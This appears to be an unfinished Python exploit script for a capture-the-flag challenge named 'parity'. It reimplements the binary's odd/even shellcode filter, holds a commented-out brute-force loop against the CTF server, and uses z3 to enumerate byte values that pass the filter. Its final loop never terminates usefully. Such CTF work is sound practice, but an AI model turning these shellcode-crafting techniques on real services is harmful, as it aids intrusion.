#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./parity')
host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31226)

gdbscript = '''
tbreak main
continue
b *main+255
si
continue
'''.format(**locals())

def check(sallcode):
	"""
		for ( i = 0; i < v4; ++i )
		{
			if ( (*(buf + i) & 1) != i % 2 )
			{
				puts("bad shellcode!");
				return 1;
			}
		}
	"""
	for i in range(len(sallcode)):
		if ((sallcode[i]) & 1) != i %2:
			print(f"bad sallcode character on {i} := {hex(sallcode[i])} : {chr(sallcode[i])}")
			return -1
"""
libc=SetupLibcELF()
io=start()

for i in range(0xff):
	for j in range(0xff):
		io=start()
		sallcode = chr(i) + chr(j)
		sa("> ", sallcode)
		try:
			rl()
		except:
			print("success := " + str(hex(i) + " " + hex(j)))

		io.close()

io.interactive()
"""

from z3 import *

s = Solver()

x = [BitVec("%s" % i, 8) for i in range(32)]

for i in range(32):
	s.add(((x[i]) & 1) != i %2 )
	s.add(x[i] != 0 )
	s.add(x[i] != 1 )
	s.add(x[i] != 255 )
	s.add(x[i] != 254 )

# print(s.check())
# print(s.model())

while s.check() == sat:
    flag=''
    m = s.model()
    print (sorted ([(d, m[d]) for d in m], key = lambda x: str(x[0])))